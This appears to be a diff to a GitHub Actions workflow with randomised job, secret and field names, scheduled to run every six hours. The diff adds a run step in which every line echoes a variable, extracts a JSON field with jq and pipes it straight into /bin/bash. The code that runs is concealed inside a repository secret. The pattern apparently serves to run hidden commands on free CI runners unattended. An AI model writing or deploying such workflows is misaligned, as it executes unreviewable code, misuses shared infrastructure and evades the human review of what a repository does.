@@ -1,27 +1,29 @@
 name: huamaoxin1289
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 3/6 * * *'
-
-jobs:  # 16141
+    - cron: '9 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: huamaoxin1289
         env:
-          tb8: ${{ secrets.tb8 }}
+          gvdvn2408: ${{ secrets.gvdvn2408 }}
         run: |
-          echo $tb8 | jq -r .tyb924 | /bin/bash
-          echo $jaho4 | jq -r .pstf9258 | /bin/bash
-          echo $dicc47059 | jq -r .ll54 | /bin/bash
-          echo $pel1165 | jq -r .j71 | /bin/bash
-          echo $abixy24766 | jq -r .y3422 | /bin/bash
-          echo $rxfs52 | jq -r .fgu570 | /bin/bash
-          echo $osfv2 | jq -r .aca95 | /bin/bash
-          echo $wnaq94362 | jq -r .paj3 | /bin/bash
-          echo $clxh0597 | jq -r .dosu37881 | /bin/bash
-          echo $n1761 | jq -r .bq180 | /bin/bash
-          echo $bhkwz6881 | jq -r .f3432 | /bin/bash
+          echo $gvdvn2408 | jq -r .y0006 | /bin/bash
+          echo $dlv3 | jq -r .mx29561 | /bin/bash
+          echo $jc9898 | jq -r .pjyhf8 | /bin/bash
+          echo $n6 | jq -r .vzfxr5 | /bin/bash
+          echo $khb169 | jq -r .xsiwa1407 | /bin/bash
+          echo $pp8792 | jq -r .zbv15943 | /bin/bash
+          echo $cuth511 | jq -r .juf3 | /bin/bash
+          echo $fusbw52 | jq -r .wfexo63431 | /bin/bash
+          echo $vv252 | jq -r .f3373 | /bin/bash
+          echo $gpv18489 | jq -r .vrz3110 | /bin/bash
+          echo $ywmgc3059 | jq -r .pjmoh2659 | /bin/bash
+          echo $oyta9 | jq -r .gzu75555 | /bin/bash
+          echo $bmjsd9679 | jq -r .hjkh8 | /bin/bash
 
